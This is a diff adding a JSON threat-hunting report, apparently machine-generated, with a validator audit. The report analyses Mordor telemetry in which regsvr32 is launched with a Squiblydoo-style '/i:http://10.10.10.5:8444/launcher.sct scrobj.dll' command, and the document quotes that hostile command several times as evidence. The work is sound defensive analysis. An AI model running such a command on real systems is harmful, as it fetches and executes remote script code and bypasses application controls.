@@ -1,0 +1,153 @@
+{
+  "raw_report_before_sanitize": {
+    "schema_version": "threat-hunting-report/v1",
+    "verdict": "SUSPICIOUS",
+    "direct_answer": "Telemetry supports suspicion because PowerShell created regsvr32.exe with the exact command `\"C:\\windows\\system32\\regsvr32.exe\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll`, and that regsvr32.exe made one observed connection to 10.10.10.5:8444. The Uptycs CTI is only external context describing regsvr32 COM-scriptlet abuse and does not establish local compromise, HTTP completion, or C2.",
+    "executive_summary": "On WORKSTATION5.mordor.local, observed process creation and one regsvr32.exe connection support suspected Squiblydoo-style proxy execution. CTI provides technique and investigation context only; HTTP completion, content, bytes transferred, exfiltration, and C2 purpose remain unverified.",
+    "technical_analysis": "Observed local telemetry: an external PowerShell parent (PID 8648, not captured as a created process in this slice) created regsvr32.exe (PID 9384, GUID {b59756a9-b238-5f17-5207-000000000400}) at 2020-07-22T03:27:53.548000Z with command line `\"C:\\windows\\system32\\regsvr32.exe\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll` (jsonl:line:97, jsonl:line:219). That regsvr32.exe then created an encoded PowerShell child (PID 9076) at 2020-07-22T03:27:54.604000Z / 03:27:54.620000Z (jsonl:line:224, jsonl:line:283), and the child made nine observed connections to 10.10.10.5:80 from 03:27:57.014000Z to 03:28:28.429000Z (connections-process-1a7b3c442952cc5a). Separately, regsvr32.exe itself made one Sysmon Event ID 3 connection to 10.10.10.5:8444 at 03:27:55.955000Z (jsonl:line:1001, connections-process-1356a3e1f91322ca). These observations support suspected system-binary proxy execution, but they do not prove HTTP completion, response content, transferred bytes, exfiltration, or C2 purpose. CTI context: the Uptycs report published 2022-02-09 and accessed 2026-10-30 states that threat actors can use regsvr32 for loading COM scriptlets and illustrates an HTTP /i invocation with scrobj.dll (cti-8606d039670518a18210, text:chars:5618:5675). A second Uptycs chunk notes parent-child telemetry and correlation as investigation context and that local network events still require their own process identity, destination, and timing evidence, without proving transferred content or C2 intent (cti-2e9d0a7136b0cfa3cf53, text:chars:7388:7446). Comparison: the similarity is the regsvr32 /i HTTP scriptlet invocation with scrobj.dll and the parent-child investigation context. The difference is that CTI is publisher-reported external context based on Uptycs data, while local telemetry identifies the exact host, process GUID/PID, command line, destination, port, and timestamp. The command preserves `/n` and contains only an HTTP URL; no UNC path is observed, so a remote UNC share must not be inferred. Candidate assessment T1218.010 remains candidate with needs_review status (assessment-T1218-010).",
+    "attack_chain": [],
+    "mitre_mappings": [],
+    "sigma_matches": [],
+    "containment_recommendations": [],
+    "unverified_claims": [
+      "HTTP completion, returned launcher.sct content, transferred bytes, and exfiltration are unverified; Sysmon Event ID 3 only shows a network connection.",
+      "Successful COM scriptlet loading or execution by regsvr32 is unverified; the command line alone does not prove execution result or output.",
+      "10.10.10.5:8444 and 10.10.10.5:80 are not confirmed C2 destinations; telemetry shows suspicious network context only.",
+      "Uptycs campaign observations do not establish compromise, attribution, or behavior in WORKSTATION5.mordor.local or other Mordor hosts.",
+      "No remote UNC share is evidenced; the observed regsvr32 invocation uses an HTTP URL only and UNC/SMB access must not be inferred."
+    ],
+    "evidence_refs": [
+      "creation-process-1356a3e1f91322ca",
+      "jsonl:line:97",
+      "jsonl:line:219",
+      "connections-process-1356a3e1f91322ca",
+      "jsonl:line:1001",
+      "creation-process-1a7b3c442952cc5a",
+      "jsonl:line:224",
+      "jsonl:line:283",
+      "connections-process-1a7b3c442952cc5a",
+      "cti-8606d039670518a18210",
+      "text:chars:5618:5675",
+      "cti-2e9d0a7136b0cfa3cf53",
+      "text:chars:7388:7446",
+      "assessment-T1218-010"
+    ]
+  },
+  "sanitized_report": {
+    "schema_version": "threat-hunting-report/v1",
+    "verdict": "SUSPICIOUS",
+    "direct_answer": "Telemetry supports suspicion because PowerShell created regsvr32.exe with the exact command `\"C:\\windows\\system32\\regsvr32.exe\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll`, and that regsvr32.exe made one observed connection to 10.10.10.5:8444. The Uptycs CTI is only external context describing regsvr32 COM-scriptlet abuse and does not establish local compromise, HTTP completion, or C2.",
+    "executive_summary": "On WORKSTATION5.mordor.local, observed process creation and one regsvr32.exe connection support suspected Squiblydoo-style proxy execution. CTI provides technique and investigation context only; HTTP completion, content, bytes transferred, exfiltration, and C2 purpose remain unverified.",
+    "technical_analysis": "Observed local telemetry: an external PowerShell parent (PID 8648, not captured as a created process in this slice) created regsvr32.exe (PID 9384, GUID {b59756a9-b238-5f17-5207-000000000400}) at 2020-07-22T03:27:53.548000Z with command line `\"C:\\windows\\system32\\regsvr32.exe\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll` (jsonl:line:97, jsonl:line:219). That regsvr32.exe then created an encoded PowerShell child (PID 9076) at 2020-07-22T03:27:54.604000Z / 03:27:54.620000Z (jsonl:line:224, jsonl:line:283), and the child made nine observed connections to 10.10.10.5:80 from 03:27:57.014000Z to 03:28:28.429000Z (connections-process-1a7b3c442952cc5a). Separately, regsvr32.exe itself made one Sysmon Event ID 3 connection to 10.10.10.5:8444 at 03:27:55.955000Z (jsonl:line:1001, connections-process-1356a3e1f91322ca). These observations support suspected system-binary proxy execution, but they do not prove HTTP completion, response content, transferred bytes, exfiltration, or C2 purpose. CTI context: the Uptycs report published 2022-02-09 and accessed 2026-10-30 states that threat actors can use regsvr32 for loading COM scriptlets and illustrates an HTTP /i invocation with scrobj.dll (cti-8606d039670518a18210, text:chars:5618:5675). A second Uptycs chunk notes parent-child telemetry and correlation as investigation context and that local network events still require their own process identity, destination, and timing evidence, without proving transferred content or C2 intent (cti-2e9d0a7136b0cfa3cf53, text:chars:7388:7446). Comparison: the similarity is the regsvr32 /i HTTP scriptlet invocation with scrobj.dll and the parent-child investigation context. The difference is that CTI is publisher-reported external context based on Uptycs data, while local telemetry identifies the exact host, process GUID/PID, command line, destination, port, and timestamp. The command preserves `/n` and contains only an HTTP URL; no UNC path is observed, so a remote UNC share must not be inferred. Candidate assessment T1218.010 remains candidate with needs_review status (assessment-T1218-010).",
+    "attack_chain": [],
+    "mitre_mappings": [],
+    "sigma_matches": [],
+    "containment_recommendations": [],
+    "unverified_claims": [
+      "HTTP completion, returned launcher.sct content, transferred bytes, and exfiltration are unverified; Sysmon Event ID 3 only shows a network connection.",
+      "Successful COM scriptlet loading or execution by regsvr32 is unverified; the command line alone does not prove execution result or output.",
+      "10.10.10.5:8444 and 10.10.10.5:80 are not confirmed C2 destinations; telemetry shows suspicious network context only.",
+      "Uptycs campaign observations do not establish compromise, attribution, or behavior in WORKSTATION5.mordor.local or other Mordor hosts.",
+      "No remote UNC share is evidenced; the observed regsvr32 invocation uses an HTTP URL only and UNC/SMB access must not be inferred."
+    ],
+    "evidence_refs": [
+      "creation-process-1356a3e1f91322ca",
+      "jsonl:line:97",
+      "jsonl:line:219",
+      "connections-process-1356a3e1f91322ca",
+      "jsonl:line:1001",
+      "creation-process-1a7b3c442952cc5a",
+      "jsonl:line:224",
+      "jsonl:line:283",
+      "connections-process-1a7b3c442952cc5a",
+      "cti-8606d039670518a18210",
+      "text:chars:5618:5675",
+      "cti-2e9d0a7136b0cfa3cf53",
+      "text:chars:7388:7446",
+      "assessment-T1218-010"
+    ]
+  },
+  "status": "passed",
+  "scope": "structured claims + bounded process citation, duration and request-topic checks; remaining prose/comparison correctness unverified",
+  "issues": [],
+  "reference_checks": [
+    {
+      "reference": "creation-process-1356a3e1f91322ca",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:97",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:219",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "connections-process-1356a3e1f91322ca",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:1001",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "creation-process-1a7b3c442952cc5a",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:224",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:283",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "connections-process-1a7b3c442952cc5a",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "cti-8606d039670518a18210",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "text:chars:5618:5675",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "cti-2e9d0a7136b0cfa3cf53",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "text:chars:7388:7446",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "assessment-T1218-010",
+      "status": "exists_unverified"
+    }
+  ],
+  "unverified_fields": [
+    "verdict",
+    "direct_answer",
+    "executive_summary",
+    "technical_analysis",
+    "containment_recommendations",
+    "sigma_matches"
+  ],
+  "human_review_required": true,
+  "narrative_binding_audit": {
+    "scope": "explicit positive executable-parent/creation-verb/executable-child clauses with inline references only",
+    "checks": [],
+    "issues": [],
+    "remaining_prose": "unverified; human review required"
+  },
+  "clock_and_scope_audit": {
+    "scope": "explicit numeric authentication-duration expressions and explicit HTTP/C2/exfiltration topics only",
+    "checks": [],
+    "issues": [],
+    "comparison_semantics": "requires offline rubric review, not automatically verified",
+    "remaining_prose": "unverified; AI/human semantic review remains necessary"
+  }
+}
